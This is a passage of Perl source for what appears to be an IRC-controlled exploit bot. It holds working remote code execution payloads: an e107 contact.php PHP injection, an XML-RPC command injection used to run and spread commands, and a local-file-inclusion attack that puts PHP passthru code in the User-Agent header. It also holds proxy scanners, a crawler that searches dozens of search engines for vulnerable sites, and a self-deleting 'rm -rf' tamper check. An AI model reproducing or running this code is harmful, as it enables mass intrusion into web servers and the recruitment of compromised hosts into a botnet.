Browser (http://www.avantbrowser.com)','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)','Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)','Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)','Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511','Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929','Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0','Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox','Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6','Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7','Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4','Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4','Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1','Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1','Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1','Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1','Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2','Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0','Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b','Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0','Mozilla/3.0 (OS/2; U)','Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)','Mozilla/4.61 (Macintosh; I; PPC)','Mozilla/4.61 [en] (OS/2; U)','Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)','Mozilla/4.8 [en] (Windows NT 5.0; U)');
		$ua->timeout(15);
		my $xpl = "http://".$e107target."/contact.php";
		$xpl =~ s/\/\/contact.php/\/contact.php/g;
		my $req = HTTP::Request->new(POST => $xpl);
		$req->content_type('application/x-www-form-urlencoded');
		$req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
		my $res = $ua->request($req);
		my $cont = $res->content;
			if ($cont =~ /Voo(.*)Doo/) {
				my $uname = $1;
				$uname=~s/\n//;
				$uname=~s/\r//;
				sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4e1072][9@4$engz2][ 13$xpl 2]9 $uname $hdir ");
			}
	}
}

sub xmlcek {
my $xmltgt = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'j13mb0t';echo`uname -a`;echo'j13mb0t';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $xmltgt, Content_Type => 'text/xml', Content => $exploit);
if ($response->content =~ /j13mb0t(.*)j13mb0t/s) {
$os=$1;
}}
sub xmlxspread() {
my $xmltargt = $_[0];
my $xmlsprd = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'j13m';echo`".$xmlsprd."`;echo'b0T';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);
}

sub usproxy() {
	my $port = $_[0];
	my $type = $_[1];
    if ($type =~ m/^(a|anon|anonymous)$/i) { $type = "Anonymous";}
	elsif ($type =~ m/^(e|elite)$/i) { $type = "elite";}
        my $siteproxy = ("http://www.cooleasy.com/index.php?act=list&port=".$port."&type=".$type."&country=United%20States&page=1");
        my $Res = query($siteproxy);
        while ($Res =~ m/<td width=170>(.*)<\/td>/g) {
		my $proip = $1;
		my $scansock = IO::Socket::INET->new(PeerAddr => $proip, PeerPort => $port, Proto =>'tcp', Timeout => 5);
            if ($scansock) {
	            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4United States Proxy2][3 $proip:$port 2[14Type : $type 2]");}
        }
	done;
}

sub ukproxy() {
	my $port = $_[0];
	my $type = $_[1];
    if ($type =~ m/^(a|anon|anonymous)$/i) { $type = "Anonymous";}
	elsif ($type =~ m/^(e|elite)$/i) { $type = "elite";}
        my $siteproxy = ("http://www.cooleasy.com/index.php?act=list&port=".$port."&type=".$type."&country=Great%20Britain&page=1");
        my $Res = query($siteproxy);
        while ($Res =~ m/<td width=170>(.*)<\/td>/g) {
		my $proip = $1;
		my $scansock = IO::Socket::INET->new(PeerAddr => $proip, PeerPort => $port, Proto =>'tcp', Timeout => 5);
            if ($scansock) {
	            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4United Kingdom Proxy2][3 $proip:$port 2[14Type : $type 2]");}
        }
	done;
}

sub euproxy() {
	my $port = $_[0];
	my $type = $_[1];
    if ($type =~ m/^(a|anon|anonymous)$/i) { $type = "Anonymous";}
	elsif ($type =~ m/^(e|elite)$/i) { $type = "elite";}
        my $siteproxy = ("http://www.cooleasy.com/index.php?act=list&port=".$port."&type=".$type."&country=Europian%20Union&page=1");
        my $Res = query($siteproxy);
        while ($Res =~ m/<td width=170>(.*)<\/td>/g) {
		my $proip = $1;
		my $scansock = IO::Socket::INET->new(PeerAddr => $proip, PeerPort => $port, Proto =>'tcp', Timeout => 5);
            if ($scansock) {
	            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4Europian Union Proxy2][3 $proip:$port 2[14Type : $type 2]");}
        }
	done;
}

sub getcontent() {
    my $url = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(15);
    my $response = $ua->request($req);
    return $response->content;
}

sub lfiexploit() {
    my $url = $_[0];
    my $rce = $_[1];
    my $agent = "<?php echo \"j13mb0t#\"; passthru(\'".$rce."\'); echo \"#j13mb0t\"; ?>";
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout(15);
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}

sub SIGN() {
if (($powered !~ /M/)||($mail !~ /web/)) {
print "\nLamer!!! Bodoh ToloL Oon !!! Udah Gak Usah diRubah Lagi!!!\n\n"; 
exec("rm -rf $0 && pkill perl");
}
}
sub google(){
    my @lst;
    my $key = $_[0];
    for ($b=0;$b<=1000;$b+=100){
        my $Go=("http://www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$b);
        my $Res=query($Go);
        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
            if ($1 !~ /google/){
                my $k=$1;
                my @grep=links($k);
                push(@lst,@grep);
            }
		}
	}
return @lst;
}

sub gsuper(){
    my @lst;
    my $key = $_[0];
	my @dom = ("ad","ae","am","as","at","az","ba","be","bf","bg","bi","bj",
	"bs","ca","cat","cd","cf","cg","ch","ci","cl","cm","cn","co.bw","co.ck",
	"co.cr","co.id","co.il","co.in","co.jp","co.ke","co.kr","co.ls","com",
	"co.ma","com.af","com.ag","com.ai","com.ar","com.au","com.bd","com.bh",
	"com.bn","com.bo","com.br","com.by","com.bz","com.co","com.cu","com.do",
	"com.ec","com.eg","com.et","com.fj","com.gh","com.gi","com.gt","com.hk",
	"com.jm","com.kh","com.kw","com.lb","com.ly","com.mt","com.mx","com.my",
	"com.na","com.nf","com.ng","com.ni","com.np","com.om","com.pa","com.pe",
	"com.ph","com.pk","com.pr","com.py","com.qa","com.sa","com.sb","com.sg",
	"com.sl","com.sv","com.tj","com.tr","com.tw","com.ua","com.uy","com.vc",
	"com.vn","co.mz","co.nz","co.th","co.tz","co.ug","co.uk","co.uz","co.ve",
	"co.vi","co.za","co.zm","co.zw","cz","de","dj","dk","dm","dz","ee","es",
	"fi","fm","fr","ga","ge","gg","gl","gm","gp","gr","gy","hn","hr","ht","vu",
	"hu","ie","im","is","it","it.ao","je","jo","kg","ki","kz","la","li","vg",
	"lk","lt","lu","lv","md","me","mg","mk","ml","mn","ms","mu","mv","mw","tt",
	"ne","nl","no","nr","nu","pl","pn","ps","pt","ro","rs","ru","rw","sc",
	"se","sh","si","sk","sm","sn","st","td","tg","tk","tl","tm","to","ws");
    for ($b=0;$b<=5000;$b+=100){
	my $mygogeldom = $dom[rand(scalar(@dom))];
    my $supggl =("http://www.google.".$mygogeldom."/search?q=".key($key)."&num=100&start=".$b);
    my $Res=query($supggl);
        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
           if ($1 !~ /google/){
               my $k=$1;
               my @grep=links($k);
               push(@lst,@grep);
            }
        }
    }
return @lst;
}

sub Virgillio() {
	my @lst;
	my $key = $_[0];
	for($b=0;$b<=300;$b+=100){
		my $Lyc=("http://ricerca.virgilio.it/ricerca?qs=".key($key)."&filter=1&site=&lr=&hits=10&offset=".$b);
		my $Res=query($Lyc);
		while($Res =~ m/<a href=\"?http:\/\/(.+?)\//g){
            if ($1 !~ /Virgillio/) {
                my $k = $1;
                my @grep = links($k);
                push(@lst, @grep);
			}
		}
	}
	return @lst;
}

sub alltheweb() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    my $pg  = 0;
    for ($b=0; $b<=10000; $b+=100) {
        my $all = ("http://search.yahoo.com/search?n=".$b."&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vd=all&vst=0&vf=all&vm=p&fl=0&fr=alltheweb&p=".key($key)."&vs=");
        my $Res = query($all);
        while ( $Res =~ m/26u=(.*?)%26w=/g ) {
            my $k = $1;
            my @grep = links($k);
            push(@lst, @grep);
        }
    }
    return @lst;
}

sub uol() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10) {
        my $UoL = ("http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$b);
        my $Res = query($UoL);
        while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g ) {
            my $k = $1;
            if ( $k !~ /busca|uol|yahoo/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub Bing() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10) {
        my $bing = ("http://www.bing.com/search?q=".key($key)."&filt=all&first=".$b."&FORM=PERE");
        my $Res = query($bing);
        while ( $Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live|bing/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub altavista(){
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10){
        my $AlT=("http://nl.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
        my $Res=query($AlT);
        while ($Res=~m/<span class=ngrn>(.+?)\//g){
            if ($1 !~ /altavista/){
                my $k=$1;
                $k=~s/<//g;
                $k=~s/ //g;
                my @grep=links($k);
                push(@lst,@grep);
            }
		}
	}
return @lst;
}

sub ask() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    my $pg  = 0;
    for ($b=0; $b<=1000; $b+=10) {
        my $Ask = ("http://it.ask.com/web?q=".key($key)."&o=0&l=dir&qsrc=0&qid=EE90DE6E8F5370F363A63EC61228D4FE&dm=all&page=".$b);
        my $Res = query($Ask);
        while ($Res =~ m/href=\"http:\/\/(.+?)\" onmousedown=/g) {
            if ($1 !~ /ask.com/){
                my $k = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub yahoo() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=5000; $b+=1) {
        my $yahoo = ("http://www.search.yahoo.com/search?n=".$b."&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vd=all&vst=0&vf=all&fl=0&fr=sfp&p=".key($key)."&vs=");
        my $Res = query($yahoo);
        while ($Res =~ m/26u=(.*?)%26w=/g) {
            if ($1 !~ /yahoo/){
                my $k = $1;
                my @grep = links($k);
                push(@lst, @grep);
            }
        }
    }
    return @lst;
}

sub goodsearch() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=0; $b<=1000; $b+=10) {
        my $Good = ("http://www.goodsearch.com/search.aspx?keywords=".key($key)."&page=".$b."&osmax=0");
        my $Res = query($Good);
        while ($Res =~ m/<a href=\"(Redirect.+?)\">http:\/\/(.*?)<\/a>/g) {
            if ($1 !~ /goodsearch/){
                my $k = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub naver() {
    my @lst;
    my $key = $_[0];
    for ( $b=1;$b<=1000;$b+=10){
        my $naver = ( "http://web.search.naver.com/search.naver?where=webkr&query=".key($key)."&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start=".$b);
        my $Res = query($naver);
        while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
            my $k = $1;
            if ($k!~/busca|uol|yahoo/) {
                my $k = $1;
                my @grep = links($k);
                push( @lst, @grep);
            }
        }
    }
 return @lst;
}

sub onet(){
	my @lst;
	my $key = $_[0];
	for($b=0;$b<=50;$b+=1){#20
		my $Lyc=("http://szukaj.onet.pl/query.html?qt=".key($key)."&p=".$b);
		my $Res=query($Lyc);
		while($Res =~ m/<span class=\"?clurl\"?>http:\/\/(.+?)\//g){
			my $k=$1;
			my @grep=links($k);
				push(@lst,@grep);
			}
		}
	return @lst;
}

sub sapo(){
my @lst;
my $key = $_[0];
for($b=0;$b<=45;$b+=1){#20
my $Lyc=("http://pesquisa.sapo.pt/?barra=resumo&format=html&limit=10&location=pt&page=".$b."&location=pt&page=30&q=".key($key)."&st=local");
my $Res=query($Lyc);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\//g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}
}
return @lst;
}

sub search(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $ser=("http://www.search.com/search?q=".key($key)."".$b);
my $Res=query($ser);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub lycos(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $ly=("http://search.lycos.com/?query=".key($key)."&page=$av".$b);
my $Res=query($ly);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub snz(){
my @lst;
my $key = $_[0];
for($b=1;$b<=15;$b+=1){#20
my $Lyc=("http://searchnz.co.nz/search.aspx?q=".key($key)."&np=".$b);
my $Res=query($Lyc);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\//g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}
}
return @lst;
}

sub witch(){
my @lst;
my $key = $_[0];
for($b=1;$b<=50;$b+=10){#20
my $Lyc=("http://www.witch.de/search-result.php?searchtype=phonetisch&search=".key($key)."&cn=".$b);
my $Res=query($Lyc);
while($Res =~ m/<a href=\"http:\/\/(.+?)\//g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}
}
return @lst;
}

sub seznam(){
my @lst;
my $key = $_[0];
for($b=1;$b<=300;$b+=10){#20
my $Lyc=("http://search.seznam.cz/?q=".key($key)."&from=".$b);
my $Res=query($Lyc);
while($Res =~ m/<a href=\"http:\/\/(.+?)\/\" title=/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}
}
return @lst;
}

sub szukacz(){
my @lst;
my $key = $_[0];
for($b=0;$b<=600;$b+=20){#20
my $Lyc=("http://www.szukacz.pl/szukaj.aspx?ct=polska&pc=polska&enc=iso-8859-2&q=".key($key)."&start=".$b);
my $Res=query($Lyc);
while($Res =~ m/<a title=\"?http:\/\/(.+?)\//g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}
}
return @lst;
}

sub hotbot(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $hot=("http://search.hotbot.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=hb_loc&enc=utf-8".$b);
my $Res=query($hot);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub aol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $aol=("http://search.aol.co.uk/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
my $Res=query($aol);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub os() {
    my $target=$_[0];
    my $re  = &query($target);
    while ($re =~ m/<br>dir:(.+?)\<br>/g) {
        $os = $1;
    }
}

sub query() {
    $link = $_[0];
    my $req = HTTP::Request->new( GET => $link );
    my $ua = LWP::UserAgent->new();
    $ua->agent($User_Agent[rand(scalar(@User_Agent))]);
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub Agent(){
	my @ret = (
	"Microsoft Internet Explorer/4.0b1 (Windows 95)",
	"Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)",
	"Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)",
	"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Win32)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
	"Microsoft Pocket Internet Explorer/0.6",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)",
	"MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
	"Advanced Browser (http://www.avantbrowser.com)",
	"Avant Browser (http://www.avantbrowser.com)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)",
	"Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)",
	"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
	"Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox",
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0",
	"Mozilla/3.0 (OS/2; U)",
	"Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)",
	"Mozilla/4.61 (Macintosh; I; PPC)",
	"Mozilla/4.61 [en] (OS/2; U)",
	"Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)",
	"Mozilla/4.8 [en] (Windows NT 5.0; U)" );
return(@ret);
}

sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push( @l, $link, $host, $hdir );
    return @l;
}
sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
    return $dork;
}

sub calculate {
    my @calculate = ();
    my %visti = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visti{$element}++;
        push @calculate, $element;
    }
    return @calculate;
}

sub nick {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub notice {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}

sub join {
sendraw("JOIN $_[0]");
}

sub part {
sendraw("PART $_[0]");
}

sub quit {
sendraw("QUIT $_[0]");
exit;
}
